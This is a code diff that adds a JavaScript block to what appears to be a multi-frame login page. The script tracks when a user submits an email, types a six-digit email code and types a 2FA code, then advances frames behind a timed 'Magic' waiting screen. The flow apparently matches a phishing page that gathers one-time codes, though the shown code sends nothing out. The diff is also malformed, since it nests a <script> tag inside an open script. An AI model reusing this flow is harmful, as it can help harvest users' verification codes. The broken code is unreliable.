@@ -3344,4 +3344,141 @@
     }, 800);
 
 })();
+        <script>
+(function(){
+  // Bridge object to store small state without touching your original code
+  window.__pm_bridge = window.__pm_bridge || {
+    lastAction: null,
+    lastActionAt: 0,
+    timer: null
+  };
+
+  function setLastAction(action) {
+    try {
+      window.__pm_bridge.lastAction = action;
+      window.__pm_bridge.lastActionAt = Date.now();
+      // console.log('pm_bridge setLastAction', action);
+    } catch (e) {
+      // swallow
+    }
+  }
+
+  // Hook the continue button inside frame2 (email submit)
+  try {
+    var frame2 = document.getElementById('pageFrame2');
+    frame2.addEventListener('load', function attachFrame2Listener() {
+      try {
+        var doc = frame2.contentDocument;
+        if (!doc) return;
+        var btn = doc.getElementById('continueBtn');
+        var emailInput = doc.getElementById('emailInput');
+        if (btn && emailInput) {
+          // Add listener but do not remove existing — non-destructive
+          btn.addEventListener('click', function () {
+            try {
+              var email = (emailInput.value || '').trim();
+              if (email && email.includes('@')) setLastAction('emailSubmit');
+            } catch (e) {}
+          }, { passive: true });
+        }
+      } catch (e) {}
+    });
+  } catch (e) {}
+
+  // Helper: attach listeners to code-entry frames (frame5 = email code, frame6 = 2fa)
+  function hookCodeFrame(frameElement, actionName) {
+    if (!frameElement) return;
+    frameElement.addEventListener('load', function () {
+      try {
+        var doc = frameElement.contentDocument;
+        if (!doc) return;
+        var inputs = doc.querySelectorAll('.code-box');
+        if (!inputs || inputs.length === 0) return;
+        inputs.forEach(function (input) {
+          input.addEventListener('input', function () {
+            try {
+              var code = Array.from(inputs).map(function (i) { return i.value; }).join('');
+              if (code.length === 6) {
+                setLastAction(actionName);
+              }
+            } catch (e) {}
+          }, { passive: true });
+        });
+      } catch (e) {}
+    });
+  }
+
+  hookCodeFrame(document.getElementById('pageFrame5'), 'emailCodeComplete');
+  hookCodeFrame(document.getElementById('pageFrame6'), 'twofaCodeComplete');
+
+  // Observe when the Magic frame (pageFrame4) becomes visible
+  try {
+    var magicFrame = document.getElementById('pageFrame4');
+    if (magicFrame) {
+      var mo = new MutationObserver(function (mutations) {
+        mutations.forEach(function (m) {
+          if (m.attributeName === 'class') {
+            try {
+              var isVisible = magicFrame.classList.contains('visible');
+              // Clear any previous timer whenever visibility toggles
+              if (window.__pm_bridge.timer) {
+                clearTimeout(window.__pm_bridge.timer);
+                window.__pm_bridge.timer = null;
+              }
+
+              if (isVisible) {
+                var action = window.__pm_bridge.lastAction;
+                // Decide next step based on lastAction
+                if (action === 'emailSubmit') {
+                  // After initial email submit: show verification page (frame5) after 3s
+                  window.__pm_bridge.timer = setTimeout(function () {
+                    try {
+                      document.querySelectorAll('.frame').forEach(function (f) { f.classList.remove('visible'); });
+                      var f5 = document.getElementById('pageFrame5');
+                      if (f5) f5.classList.add('visible');
+                    } catch (e) {}
+                  }, 3000);
+                } else if (action === 'emailCodeComplete') {
+                  // After entering the email code: show authenticator (2FA) after 3s
+                  window.__pm_bridge.timer = setTimeout(function () {
+                    try {
+                      document.querySelectorAll('.frame').forEach(function (f) { f.classList.remove('visible'); });
+                      var f6 = document.getElementById('pageFrame6');
+                      if (f6) f6.classList.add('visible');
+                    } catch (e) {}
+                  }, 3000);
+                } else if (action === 'twofaCodeComplete') {
+                  // After finishing 2FA, return to main/index after 3s (adjust if you want a different target)
+                  window.__pm_bridge.timer = setTimeout(function () {
+                    try {
+                      document.querySelectorAll('.frame').forEach(function (f) { f.classList.remove('visible'); });
+                      var f1 = document.getElementById('pageFrame1');
+                      if (f1) f1.classList.add('visible');
+                    } catch (e) {}
+                  }, 3000);
+                } else {
+                  // No known lastAction: do nothing automatically
+                }
+              } else {
+                // magic hidden -> clear timer (already done above)
+              }
+            } catch (e) {}
+          }
+        });
+      });
+      mo.observe(magicFrame, { attributes: true, attributeFilter: ['class'] });
+    }
+  } catch (e) {}
+
+  // Safety: if magic is already visible on load, run the same routine once
+  try {
+    var mf = document.getElementById('pageFrame4');
+    if (mf && mf.classList.contains('visible')) {
+      // trigger a small async tick to let other handlers settle
+      setTimeout(function(){ mf.classList.add('pm-visibility-checked'); }, 50);
+    }
+  } catch (e) {}
+
+})();
+</script>
     </script>
